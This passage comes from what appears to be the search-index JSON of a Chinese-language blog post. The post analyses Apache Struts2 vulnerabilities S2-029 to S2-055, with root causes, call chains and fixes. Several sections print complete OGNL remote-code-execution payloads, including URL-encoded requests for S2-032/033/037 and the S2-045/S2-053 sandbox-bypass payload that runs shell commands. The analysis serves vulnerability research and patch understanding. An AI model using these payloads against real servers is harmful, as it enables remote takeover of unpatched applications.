((#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ret=@java.lang.Runtime@getRuntime().exec('id'))).(#q=@org.apache.commons.io.IOUtils@toString(#ret.getInputStream()))\n</code></pre>","tags":["Java"]},{"location":"blog/2020/talk_about_struts2/#s2-029","title":"\u4fee\u590dS2-029","text":"<p><code>com.opensymphony.xwork2.ognl.OgnlUtil#compileAndExecute</code></p> <p></p> <p>\u5728\u8ba1\u7b97\u8868\u8fbe\u5f0f\u4e4b\u524d\uff0c\u9a8c\u8bc1\u662f\u5426\u53ef\u4ee5\u6267\u884c</p> <p></p> <p></p> <p>\u8fd9\u91cc\u5148\u770b<code>node.isEvalChain</code>\uff0c\u8fd9\u91cc\u662f\u5bf9S2-009\u505a\u7684\u9650\u5236\uff0c\u4e5f\u5c31\u662f\u5f53\u51fa\u73b0<code>((1)(2))</code>\u65f6\uff0c\u4f1a\u89e3\u6790\u51fa<code>ASTEval</code>\u8282\u70b9\uff0c\u800c<code>ASTEval</code>\u5bf9\u8c61\u7684<code>isEvalChain</code>\u51fd\u6570\u76f4\u63a5\u8fd4\u56detrue\uff0c\u4e5f\u5c31\u4f7f\u5f97<code>(1)(2)</code>\u65e0\u6cd5\u6267\u884c</p> <p>\u5176\u6b21\u518d\u6765\u770b<code>node.isSequence</code>\uff0c\u8fd9\u91cc\u662f\u5bf9\u5f62\u5982<code>(xxx1,xxx2,xxx3)</code>\u7684OGNL\u8868\u8fbe\u5f0f\u7684\u9650\u5236\uff0c\u4ed6\u5c06\u89e3\u6790\u51fa<code>ASTSequence</code>\u8282\u70b9\uff0c<code>ASTSequence</code>\u5bf9\u8c61\u7684<code>isSequence</code>\u76f4\u63a5\u8fd4\u56detrue\uff0c\u4e5f\u5c31\u9650\u5236\u4e86\u8fd9\u79cd\u8868\u8fbe\u5f0f\u7684\u6267\u884c</p> <p>\u7136\u540e\u6bd4\u8f83\u6709\u610f\u601d\u7684\u662f\uff0c\u5bf9\u4e8e\u5f62\u5982<code>((xxx1).(xxx2).(xxx3))</code>\u7684OGNL\u8868\u8fbe\u5f0f\uff0c\u8fd9\u662f\u4e00\u79cd<code>ASTChain</code>\uff0c\u4f46\u5176\u4e2d\u5e76\u4e0d\u4f1a\u89e3\u6790\u51fa<code>ASTEval</code></p> <p>\u770b\u524d\u9762\u7684\u5206\u6790\uff0c\u77e5\u9053\u53ef\u4ee5\u5c06S2-029\u7684\u4fee\u590dbypass\u6389\uff0c\u4e5f\u5c31\u662fS2-036\u7684\u95ee\u9898</p>","tags":["Java"]},{"location":"blog/2020/talk_about_struts2/#13-s2-032s2-033s2-037","title":"13. S2-032/S2-033/S2-037","text":"<p>\u5f71\u54cd\u8303\u56f4\uff1aStruts 2.3.20 - Struts Struts 2.3.28 (except 2.3.20.3 and 2.3.24.3)</p> <p>\u8fd9\u91cc\u6211\u7684\u73af\u5883\u642d\u7684\u662frest-showcase\u7684\uff0c\u6240\u4ee5\u4e3b\u8981\u8bb2S2-033\uff08S2-032\u7684\u539f\u7406\u8ddf\u4ed6\u5dee\u4e0d\u591a\uff0c\u53ea\u662f\u89e6\u53d1\u53d8\u6210\u4e86<code>method:#_xxxx</code>)</p> <p>rest-plugin\u652f\u6301\u89e3\u6790<code>xxx!method</code>\u7684\u8c03\u7528</p> <p><code>org.apache.struts2.rest.RestActionMapper#handleDynamicMethodInvocation</code>\u89e3\u6790<code>name!method</code>\uff0c\u5e76\u5bf9\u5f53\u524d\u7684<code>restactionmapper</code>\u8bbe\u7f6e\u597d\u540e\u7eed\u8981\u8c03\u7528method</p> <p></p> <p>\u5728struts2\u7684\u6240\u6709intercepter\u8c03\u7528\u5b8c\u6bd5\u540e\uff0c\u4f1a\u53bb\u8c03\u7528DefaultActionInvocation\u7684invokeActionOnly\u51fd\u6570</p> <p></p> <p>\u800cinvokeActionOnly\u4f1a\u53bb\u8c03\u7528<code>com.opensymphony.xwork2.DefaultActionInvocation#invokeAction</code></p> <p></p> <p>\u5728\u8fd9\u4e2a\u51fd\u6570\u91cc\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u4ed6\u5c06\u524d\u9762\u53ef\u63a7\u7684methodName\u653e\u8fdb\u4e86<code>ognlUtil.getValue</code>\uff0c\u5bfc\u81f4\u4e86OGNL\u8868\u8fbe\u5f0f\u7684\u6267\u884c</p> <p>\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728\u524d\u9762\u8c03\u7528\u7684interceptor\u91cc\u4e0d\u80fd\u51fa\u73b0\u5f02\u5e38\u7684\u60c5\u51b5\uff0c\u4f1a\u5bfc\u81f4\u65e0\u6cd5\u6267\u884c\u5230OGNL\u8868\u8fbe\u5f0f\u6267\u884c\u7684\u4f4d\u7f6e\u3002\u8fd9\u4e5f\u5c31\u662f\u4e3a\u4ec0\u4e48\u4e0d\u80fd\u5728\u5f00\u542f<code>devMode</code>\u7684\u60c5\u51b5\u4e0b\u8fdb\u884c\u5229\u7528\u7684\u539f\u56e0\u3002</p>","tags":["Java"]},{"location":"blog/2020/talk_about_struts2/#poc_12","title":"POC","text":"<pre><code>http://localhost:8080/showcase_war/orders/3!%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2C%23process%3D%40java.lang.Runtime%40getRuntime().exec(%23parameters.command%5B0%5D)%2C%23ros%3D(%40org.apache.struts2.ServletActionContext%40getResponse().getOutputStream())%2C%40org.apache.commons.io.IOUtils%40copy(%23process.getInputStream()%2C%23ros)%2C%23ros.flush()%2C%23xx%3D123%2C%23xx.toString.json?command=ifconfig\n\n// S2-037\nhttp://localhost:8080/showcase_war/orders/3!(%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS)%3F(%23process%3D%40java.lang.Runtime%40getRuntime().exec(%23parameters.command%5B0%5D)%2C%23ros%3D(%40org.apache.struts2.ServletActionContext%40getResponse().getOutputStream())%2C%40org.apache.commons.io.IOUtils%40copy(%23process.getInputStream()%2C%23ros)%2C%23ros.flush())%3Ad.json?command=ifconfig\n</code></pre> <p>\u8fd9\u91cc\u6211\u4eec\u6267\u884c\u7684\u547d\u4ee4\u7528<code>#parameters.command[0]</code>\u7684\u65b9\u5f0f\u6765\u83b7\u53d6\uff0c\u8fd9\u662f\u56e0\u4e3a\u5728\u751f\u6210<code>DefaultActionProxy</code>\u7684\u65f6\u5019\u5bf9methodName\u505a\u4e86\u8f6c\u4e49\u5904\u7406\uff0c\u4e3a\u4e86\u907f\u514d\u8f6c\u4e49\u7834\u574fOGNL\u8868\u8fbe\u5f0f\uff0c\u7528<code>#parameters</code>\u7684\u65b9\u5f0f\u4ece\u53c2\u6570\u4e2d\u83b7\u53d6\u3002</p> <p>\u8fd8\u6709\u4e00\u4e2a\u9700\u8981\u6ce8\u610f\u7684\u5730\u65b9\u662f\uff0c\u5728\u6700\u540e\u8c03\u7528<code>ognlUtil.getValue</code>\u65f6\uff0c\u5728methodName\u540e\u9762\u62fc\u63a5\u4e86<code>()</code>\uff0c\u6211\u4eec\u9700\u8981\u5c06\u8fd9\u4e2a<code>()</code>\u505a\u5904\u7406\uff0c\u6bd4\u5982\u8fd9\u91cc\u7684POC\u505a\u7684\u5904\u7406\u662f<code>#xx.toString</code>\u53bb\u5403\u6389\u8fd9\u4e2a<code>()</code></p>","tags":["Java"]},{"location":"blog/2020/talk_about_struts2/#s2-032s2-033","title":"S2-032/S2-033\u4fee\u590d","text":"<p><code>xwork-core:2.3.28.1</code>\u5728<code>OgnlUtil.isEvalExpression</code>\u589e\u52a0\u4e86<code>isSequence</code>\u7684\u5224\u65ad</p> <p>\u8fd9\u91cc\u51fa\u73b0\u4e86\u65b0\u7684\u4e00\u79cd\u5229\u7528\u65b9\u5f0f<code>(1)?(2):(3)</code>\uff0c\u8fd9\u79cd\u5f62\u5f0f\u7684OGNL\u8868\u8fbe\u5f0f\u5c06\u6709<code>ASTTest</code>\u5bf9\u8c61\u6765\u5904\u7406</p> <p>\u800c<code>isEvalChain()</code>\u548c<code>isSequence()</code>\u9650\u5236\u7684\u662f<code>ASTEval</code>\u548c<code>ASTSequence</code>\u5bf9\u8c61\uff0c\u8fd9\u91cc\u5e76\u6ca1\u6709\u5bf9ASTTest\u505a\u9650\u5236\uff0c\u5e76\u4e14\u7531\u4e8e<code>isSequence</code>\u5e76\u4e0d\u662f\u9012\u5f52\u53bb\u5224\u65ad\u7684\uff0c\u6240\u4ee5\u5728<code>ASTTest</code>\u7684children\u8282\u70b9\u4e0a\u518d\u51fa\u73b0<code>ASTSequence</code>\u4e5f\u662fok\u7684</p> <p>\u6839\u636e\u8fd9\u4e2a\u539f\u7406\uff0c\u6211\u4eec\u53ef\u4ee5\u5199\u51fa\u65b0\u7684POC</p> <pre><code>(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)?(#process=@java.lang.Runtime@getRuntime().exec(#parameters.command[0]),#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()),@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros),#ros.flush()):d.json\n</code></pre>","tags":["Java"]},{"location":"blog/2020/talk_about_struts2/#s2-037","title":"S2-037\u4fee\u590d","text":"<p>\u5728\u89e3\u6790<code>name!method</code>\u7684\u5730\u65b9\uff0c\u8c03\u7528\u4e86<code>cleanupActionName</code></p> <p></p> <p>\u4f7f\u7528\u4e86\u6b63\u5219\uff0c\u9632\u6b62\u51fa\u73b0<code>(#@)</code>\u7b49\u7279\u6b8a\u5b57\u7b26\uff0c\u51fa\u73b0\u5c31\u62a5\u9519\uff0c\u4e5f\u5c31\u5230\u4e0d\u4e86\u540e\u7eed\u7684OGNL\u8868\u8fbe\u5f0f\u7684\u6267\u884c</p> <p>\u5e76\u4e14\u5728\u7981\u6b62\u7684class\u5217\u8868\u91cc\u589e\u52a0\u4e86\u4e24\u4e2a</p> <p></p> <p>\u4f7f\u5f97\u6211\u4eec\u4e0d\u80fd\u5728\u7528<code>#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS</code>\u6765\u7ed5\u8fc7\u9650\u5236</p>","tags":["Java"]},{"location":"blog/2020/talk_about_struts2/#_12","title":"\u4e00\u4e2a\u6709\u610f\u601d\u7684\u5730\u65b9","text":"<p>\u524d\u9762\u8bf4\u5230\u8fd93\u4e2a\u6f0f\u6d1e\u9700\u8981\u5f00\u542fDynamicMethodInvocation\uff0c\u5176\u5b9e\u4e0d\u5f00\u542f\u4e5f\u662f\u53ef\u4ee5\u7684</p> <p>\u524d\u9762\u8bf4\u7684\u51e0\u79cd\u65b9\u6cd5\u90fd\u662f\u5728\u5904\u7406<code>name!method</code>\u8fd9\u4e2a\u683c\u5f0f\uff0crest\u5176\u5b9e\u8fd8\u652f\u6301\u5bf9<code>action/id/method</code>\u7684\u89e3\u6790</p> <p></p> <p>\u6240\u4ee5\u6539\u6539POC\u5c31\u80fd\u901a\u6740rest-plugin\u4e86</p> <pre><code>http://localhost:8080/showcase_war/orders/3/(%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS)%3F(%23process%3D%40java.lang.Runtime%40getRuntime().exec(%23parameters.command%5B0%5D)%2C%23ros%3D(%40org.apache.struts2.ServletActionContext%40getResponse().getOutputStream())%2C%40org.apache.commons.io.IOUtils%40copy(%23process.getInputStream()%2C%23ros)%2C%23ros.flush())%3Ad.json?command=ifconfig\n</code></pre>","tags":["Java"]},{"location":"blog/2020/talk_about_struts2/#14-s2-045s2-046","title":"14. S2-045/S2-046","text":"<p>\u5f71\u54cd\u7248\u672c\uff1aStruts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10</p> <p>S2-046\u539f\u7406\u4e00\u6837\uff0c\u8fd9\u91cc\u53ea\u5206\u6790S2-045</p> <p>\u8fd9\u91cc2.3\u548c2.5\u7248\u672c\u53d8\u5316\u6bd4\u8f83\u5927\uff0c\u8fd9\u91cc\u4ee52.3.31\u7684\u4ee3\u7801\u5206\u6790\uff0c\u770b2.5\u7684\u53ef\u4ee5\u770bhttps://paper.seebug.org/247/</p> <p>\u4ecestruts2\u7684\u5de5\u4f5c\u6d41\u7a0b\u56fe\u6765\u770b\uff0c\u6240\u6709\u7684\u8bf7\u6c42\u5728\u751f\u6210ActionProxy\u4e4b\u524d\uff0c\u90fd\u7531FilterDispatcher\u6765\u5904\u7406\uff0c2.3\u7248\u672c\u7528\u7684\u662f<code>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter</code>\uff0c\u8fd9\u91cc\u5728\u8c03\u7528action\u4e4b\u524d\u4f1a\u5148\u5c01\u88c5request\u3002</p> <p>\u770b\u770b\u8c03\u7528\u6808</p> <p></p> <p>\u5c01\u88c5\u5b9e\u9645\u7531<code>org.apache.struts2.dispatcher.Dispatcher#wrapRequest</code>\u5904\u7406</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\u8fd9\u91cc\u5728\u5904\u7406<code>Content-Type: multipart/form-data</code>\u7c7b\u578b\u65f6\uff0c\u4f1a\u751f\u6210<code>org.apache.struts2.dispatcher.multipart.MultiPartRequestWrapper</code>\u5904\u7406\uff0cS2-045\u5c31\u662f\u51fa\u95ee\u9898\u5728\u8fd9\u91cc</p> <p></p> <p>\u5728\u7528<code>JakartaMultiPartRequest</code>\u89e3\u6790request\u5305\u65f6\uff0c\u8c03\u7528<code>org.apache.commons.fileupload.FileUploadBase.FileItemIteratorImpl#FileItemIteratorImpl</code>\u6765\u68c0\u67e5Content-Type\u7684\u5185\u5bb9\uff0c\u9700\u8981\u7531multipart/\u5f00\u5934\u624d\u884c\uff0c\u4e0d\u7136\u5c31\u662f\u62a5\u9519\u5e76\u5c06\u5177\u4f53\u7684contentType\u5185\u5bb9\u5199\u5230\u5f02\u5e38\u91cc</p> <p></p> <p>\u8fd9\u91cc\u6211\u4eec\u7684\u53ef\u63a7\u6570\u636e\u5c31\u5230\u4e86\u5f02\u5e38\u4e0a\uff0c\u5c31\u770bstruts2\u662f\u600e\u4e48\u5904\u7406\u5f02\u5e38\u4e86</p> <p><code>org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest#parse</code></p> <p></p> <p></p> <p>\u53ef\u63a7\u5185\u5bb9\u4f20\u5165\u4e86<code>com.opensymphony.xwork2.util.LocalizedTextUtil#findText</code></p> <p></p> <p></p> <p>\u5f53\u524d\u90fd\u6ca1\u751f\u6210\u9519\u8bef\u4fe1\u606f\u65f6\uff0c\u5c06\u83b7\u53d6\u9ed8\u8ba4\u7684message</p> <p></p> <p>\u8fd9\u91cc\u5230\u4e86\u6211\u4eec\u719f\u6089\u7684<code>TextParseUtil.translateVariables</code>\u51fd\u6570\uff0c\u4ed6\u540e\u7eed\u4f1a\u5904\u7406\u8ba1\u7b97OGNL\u8868\u8fbe\u5f0f</p> <p>\u7b80\u5355\u6765\u8bf4\uff0c\u6574\u4e2a\u8fc7\u7a0b\u4ece\u62a5\u9519\u5f00\u59cb\u5b58\u5165OGNL\u8868\u8fbe\u5f0f\uff0c\u518d\u751f\u6210\u9519\u8bef\u4fe1\u606f\u7684\u65f6\u5019\u8ba1\u7b97\u4e86OGNL\u8868\u8fbe\u5f0f</p> <p>\u5230\u4e86\u8fd9\u91cc\u6267\u884c\u53ef\u63a7\u7684OGNL\u8868\u8fbe\u5f0f\u662f\u7b2c\u4e00\u6b65\uff0c\u56e0\u4e3a2.3.29\u589e\u52a0\u4e86\u5bf9<code>#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS</code>\u7684\u9650\u5236</p> <p>\u9700\u8981\u4e00\u79cd\u65b0\u7684\u601d\u8def\u6765\u7ed5\u8fc7\uff0cS2-045\u7684POC\u5c31\u7ed9\u6211\u4eec\u63d0\u4f9b\u8fd9\u6837\u4e00\u4e2a\u601d\u8def</p>","tags":["Java"]},{"location":"blog/2020/talk_about_struts2/#poc_13","title":"POC","text":"<pre><code>%{\n(#_='multipart/form-data').\n(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).\n(#_memberAccess?(#_memberAccess=#dm):\n        (\n        (#container=#context['com.opensymphony.xwork2.ActionContext.container']).\n        (#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).\n        (#ognlUtil.getExcludedPackageNames().clear()).\n        (#ognlUtil.getExcludedClasses().clear()).\n        (#context.setMemberAccess(#dm)))).\n(#cmd='id').\n(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).\n(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).\n(#p=new java.lang.ProcessBuilder(#cmds)).\n(#p.redirectErrorStream(true)).\n(#process=#p.start()).\n(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).\n(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).\n(#ros.flush())\n}\n</code></pre> <p>\u4e3b\u8981\u770b5-10\u884c\uff0c\u4e00\u5f00\u59cb\u7684\u601d\u8def\u662f\u76f4\u63a5\u7528\u8d4b\u503c\u7684\u65b9\u5f0f\u6765\u8986\u76d6\u5b58\u5728\u9650\u5236\u7684SecurityMemberAccess\uff0c\u4f46\u662f\u73b0\u5728\u6709\u4e86<code>excludedClasses</code>\u7684\u9650\u5236\u4e0d\u80fd\u76f4\u63a5\u7528\u8fd9\u79cd\u65b9\u5f0f\u6765\u8fbe\u6210\uff08\u5177\u4f53\u770b<code>SecurityMemberAccess.isAccessible</code>\uff09\u3002</p> <p>\u90a3\u4e48\u5c31\u770b\u770b\u80fd\u4e0d\u80fd\u7528setters\u53bb\u8bbe\u7f6e<code>SecurityMemberAccess</code></p> <p>\u8fd9\u91cc\u5c31\u770b<code>ognl.OgnlContext#setMemberAccess</code>\uff0c\u800c\u8fd9\u4e2acontext\u5c31\u662f\u6211\u4eec\u5728OGNL\u8868\u8fbe\u5f0f\u91cc\u7528<code>#context</code>\u8868\u793a\u7684</p> <p>\u90a3\u4e48\u76f4\u63a5\u7528<code>#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)</code>\u5c31\u53ef\u4ee5\u8986\u76d6\u539f\u6709\u7684MemberAccess\uff0c\u4f46\u662f\u56e0\u4e3a<code>#context</code>\u672c\u8eab\u5c31\u662f\u88ab\u7981\u6b62\u7684\u7c7b\uff0c\u6211\u4eec\u4e0d\u80fd\u76f4\u63a5\u8c03\u7528\u4ed6\u3002</p> <p>\u6211\u4eec\u9700\u8981\u9996\u5148\u53bb\u9664\u6389<code>ExcludedPackageNames</code>\u548c<code>ExcludedClasses</code></p> <p>\u6765\u770b\u770b\u4ed6\u662f\u600e\u4e48\u8bbe\u7f6e\u7684<code>com.opensymphony.xwork2.ognl.OgnlValueStack#setOgnlUtil</code></p> <p></p> <p>\u53ef\u4ee5\u770b\u5230<code>securityMemberAccess</code>\u7684\u76f8\u5173\u7981\u7528\u8bbe\u7f6e\u90fd\u662f\u6765\u81ea\u4e8e<code>ognlUtil</code>\uff0c\u8fd9\u610f\u5473\u7740\u6211\u4eec\u53ea\u9700\u8981\u6e05\u9664\u6389<code>ognlUtil</code>\u7684\u7981\u7528\u8bbe\u7f6e\u5c31\u53ef\u4ee5\u6d88\u9664\u6389<code>securityMemberAccess</code>\u7684\u9650\u5236\u3002\u8fd9\u662f\u56e0\u4e3a\u5728jvm\u91cc\u9762\u4ed6\u4eec\u7528\u7684\u90fd\u662f\u540c\u4e00\u4e2a\u5b9e\u4f8b\u3002</p> <p>\u6240\u4ee5\u4e0a\u9762\u7684POC\u4e2d\u7528struts2\u7684container\u7684\u65b9\u5f0f\u53bb\u83b7\u53d6ognlUtil\u5b9e\u4f8b\uff0c\u5e76\u5c06\u5176\u7981\u7528\u8bbe\u7f6e\u5168\u90e8\u6e05\u9664\u6389</p> <p>\u90a3\u4e48\u540e\u9762\u518d\u7528<code>#context.setMemberAccess</code>\u5c31\u6ca1\u6709\u963b\u788d\u4e86</p> <p>\u540e\u7eed\u7684\u4ee3\u7801\u5c31\u662f\u6267\u884c\u5e76\u56de\u663e\u4e86\uff0c\u8ddf\u524d\u9762\u7684\u7c7b\u4f3c</p>","tags":["Java"]},{"location":"blog/2020/talk_about_struts2/#_13","title":"\u4fee\u590d","text":"<p>\u4fee\u590d\u4e3b\u8981\u662f\u4e0d\u628amessage\u4f20\u5165\uff0c\u653e\u5230\u4e86args\u7684\u4f4d\u7f6e</p>","tags":["Java"]},{"location":"blog/2020/talk_about_struts2/#15-s2-048","title":"15. S2-048","text":"<p>\u8fd9\u4e00\u90e8\u5206\u4e0d\u4ed4\u7ec6\u8bf4\u4e86\uff0c\u770bhttps://www.freebuf.com/vuls/217482.html</p>","tags":["Java"]},{"location":"blog/2020/talk_about_struts2/#16-s2-052","title":"16. S2-052","text":"<p>\u5f71\u54cd\u8303\u56f4:Struts 2.1.6 - Struts 2.3.33, Struts 2.5 - Struts 2.5.12</p> <p>The REST Plugin is using a <code>XStreamHandler</code> with an instance of XStream for deserialization without any type filtering and this can lead to Remote Code Execution when deserializing XML payloads.</p> <p>struts2\u7684rest\u63d2\u4ef6\u6ce8\u518c\u4e86ContentTypeInterceptor\u6765\u5904\u7406\u4e0d\u540c\u7684content-type</p> <p></p> <p>\u9488\u5bf9xml\u7c7b\u578b\uff0c\u5c06\u8c03\u7528<code>XStreamHandler</code>\u6765\u5904\u7406</p> <p><code>org.apache.struts2.rest.ContentTypeInterceptor#intercept</code></p> <p></p> <p>\u6839\u636erequest\u8bf7\u6c42\u9009\u62e9handler\uff0c\u8fd9\u91cc\u6211\u4eec\u4f20\u5165<code>application/xml</code>\u7c7b\u578b\uff0c\u5c06\u4f7f\u7528<code>org.apache.struts2.rest.handler.XStreamHandler#toObject</code>\u6765\u5904\u7406xml</p> <p></p> <p>\u8fd9\u91cc\u7528\u4e86\u6700\u7b80\u5355\u7684\u8c03\u7528\u65b9\u5f0f\uff081.4.8\u7248\u672c\uff09\uff0c\u6ca1\u6709\u505axstream\u7684\u76f8\u5173\u5b89\u5168\u5904\u7406\uff0c\u5bfc\u81f4XStream\u53cd\u5e8f\u5217\u5316</p> <p>\u6240\u4ee5\u6211\u4eec\u4f20\u5165\u6784\u9020\u597d\u7684XML\u5c31\u53ef\u4ee5\u8fbe\u5230\u547d\u4ee4\u6267\u884c</p>","tags":["Java"]},{"location":"blog/2020/talk_about_struts2/#poc_14","title":"POC","text":"<p>\u8fd9\u91cc\u7684xml\u53ef\u4ee5\u7528\u6211\u7684ysomap\u53bb\u751f\u6210\uff0c\u628aContent-Type\u8bbe\u7f6e\u6210<code>application/xml</code>\u5c31\u53ef\u4ee5\u4e86</p>","tags":["Java"]},{"location":"blog/2020/talk_about_struts2/#_14","title":"\u4fee\u590d","text":"<p>S2-052\u8ddf\u4ee5\u5f80\u7684\u6f0f\u6d1e\u4e0d\u4e00\u6837\uff0c\u8fd9\u91cc\u8ddfOGNL\u8868\u8fbe\u5f0f\u5e76\u6ca1\u6709\u4ec0\u4e48\u5173\u7cfb\u4e86\uff0c\u4fee\u590d\u4e5f\u6bd4\u8f83\u7b80\u5355</p> <p>\u5347\u7ea7XStream\u5230\u4e861.4.10\u7248\u672c\uff0c\u5e76\u4e14\u6dfb\u52a0\u4e86\u5b89\u5168\u63aa\u65bd</p> <p></p> <p>\u8fd9\u91cc\u65b0\u6dfb\u52a0\u4e86<code>AllowedClasses</code>\u3001<code>AllowedClassNames</code>\u3001<code>XStreamPermissionProvider</code>\u6765\u8bbe\u7f6e\u6bcf\u4e2a\u7c7b\u53ef\u4ee5\u53cd\u5e8f\u5217\u5316\u7684\u5bf9\u8c61\u5217\u8868</p> <p>\u4e5f\u4f1a\u6dfb\u52a0\u4e00\u4e9b\u9ed8\u8ba4\u7684\u7c7b</p> <p></p> <p>\u8fd9\u91cc\u7684\u7528\u6cd5\u5c31\u662fXStream\u5b98\u65b9\u63a8\u8350\u7684\uff0c\u91c7\u7528\u767d\u540d\u5355\u7684\u65b9\u5f0f\u6765\u9632\u6b62\u4e0d\u5b89\u5168\u7684\u53cd\u5e8f\u5217\u5316</p>","tags":["Java"]},{"location":"blog/2020/talk_about_struts2/#17-s2-053","title":"17. S2-053","text":"<p>\u5f71\u54cd\u7248\u672c:Struts 2.0.0 - 2.3.33 ,Struts 2.5 - Struts 2.5.10.1</p> <p>S2-053\u95ee\u9898\u51fa\u5728freemarker\u7684\u6807\u7b7e\u5185\u5bb9\u53ef\u63a7\u65f6\u51fa\u73b0\u7684\u95ee\u9898</p> <p></p> <p>\u5728action\u6267\u884c\u7ed3\u675f\u540e\uff0c\u7531\u4e8e\u8bbe\u7f6e\u7684\u7c7b\u578b\u4e3afreemarker\uff0c\u6240\u4ee5\u7ed3\u679c\u4ea4\u7531freemarker\u6765\u5904\u7406</p> <p></p> <p>\u5173\u6ce8\u5bf9freemarker\u6807\u7b7e\u89e3\u6790\u7684\u7c7b<code>org.apache.struts2.views.freemarker.tags.CallbackWriter#onStart</code></p> <p></p> <p>\u56e0\u4e3a\u8fd9\u91cc\u6211\u4eec\u65f6url\u6807\u7b7e\uff0c\u6240\u4ee5\u7531<code>org.apache.struts2.components.URL#start</code>\u6765\u5904\u7406</p> <p></p> <p>\u56de\u5230\u4e86\u7531<code>ServletUrlRenderer</code>\u6765\u89e3\u6790\u6211\u4eec\u4f20\u5165\u7684OGNL\u8868\u8fbe\u5f0f\uff0c\u8ddfS2-013\u4e00\u6837\uff0c\u540e\u7eed\u4e5f\u662f\u7531<code>TextParseUtil.translateVariables</code>\u89e6\u53d1\u7684</p>","tags":["Java"]},{"location":"blog/2020/talk_about_struts2/#poc_15","title":"POC","text":"<p>poc\u53ef\u4ee5\u76f4\u63a5\u7528S2-045\u7684poc</p> <pre><code>%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}\n// \u8bb0\u5f97\u7f16\u7801\n</code></pre>","tags":["Java"]},{"location":"blog/2020/talk_about_struts2/#_15","title":"\u4fee\u590d","text":"<p>\u8fd9\u6b21\u7684\u4fee\u590d\u662f\u5728FreemarkerManager\u4e2d\u591a\u4e86\u4e24\u884c\u4ee3\u7801\uff0c</p> <pre><code> LOG.debug(\"Sets NewBuiltinClassResolver to TemplateClassResolver.SAFER_RESOLVER\", new String[0]);\nconfiguration.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);\n</code></pre> <p>\u53bb\u770b\u4e86\u4e00\u4e0bTemplateClassResolver.SAFER_RESOLVER)\u7684\u5b98\u65b9\u6587\u6863\uff0c</p> <pre><code>TemplateClassResolver.SAFER_RESOLVER now disallows creating freemarker.template.utility.JythonRuntime and freemarker.template.utility.Execute. This change affects the behavior of the new built-in if FreeMarker was configured to use SAFER_RESOLVER, which is not the default until 2.4 and is hence improbable.\n</code></pre> <p>\u5927\u81f4\u610f\u601d\u5e94\u8be5\u5c31\u662f\u7981\u6b62\u4e86freemarker\u7684RCE\uff0c\u5177\u4f53\u6211\u5bf9freemarker\u4e0d\u592a\u4e86\u89e3\uff0c\u5c31\u4e0d\u53bb\u8bef\u4eba\u5b50\u5f1f\u4e86\u3002</p> <p>\u4fee\u590d\u76f4\u63a5\u53c2\u8003https://www.freebuf.com/vuls/217482.html</p>","tags":["Java"]},{"location":"blog/2020/talk_about_struts2/#18-s2-055","title":"18. S2-055","text":"<p>\u5f71\u54cd\u8303\u56f4\uff1aStruts 2.5 - Struts 2.5.14</p> <p>S2-055\u6f0f\u6d1e\u539f\u7406\u8ddfS2-052\u4e00\u6837\uff0c\u7531jackson\u5e93\u5904\u7406json\u5185\u5bb9\u65f6\u4ea7\u751f\u7684\u6f0f\u6d1e\uff0c\u8fd9\u91cc\u9ed8\u8ba4\u4e0d\u662f\u7528jackson\u5904\u7406json\u5185\u5bb9\u7684\uff0c\u5f97\u5728struts.xml\u914d\u7f6e</p> <pre><code>&lt;bean type=\"org.apache.struts2.rest.handler.ContentTypeHandler\" name=\"jackson\" class=\"org.apache.struts2.rest.handler.JacksonLibHandler\"/&gt;\n    &lt;constant name=\"struts.rest.handlerOverride.json\" value=\"jackson\"/&gt;\n</code></pre> <p>\u8fd9\u91cc\u672c\u8eab\u662f\u56e0\u4e3ajackson\u53cd\u5e8f\u5217\u5316\u95ee\u9898\u4ea7\u751f\u7684\uff0c\u540e\u9762\u62bd\u7a7a\u5206\u6790\u4e00\u4e0b\u8fd9\u4e2ajackson\uff0c\u8fd9\u91cc\u4e0d\u7ee7\u7eed\u5206\u6790\u4e86</p> <p>\u56e0\u4e3a\u9700\u8981\u914d\u7f6e\u624d\u53ef\u4ee5\u6253\uff0c\u6240\u4ee5\u8fd9\u91cc\u7684\u5371\u5bb3\u5e76\u6ca1\u6709\u60f3xstream\u4e00\u6837\u4e25\u91cd</p> 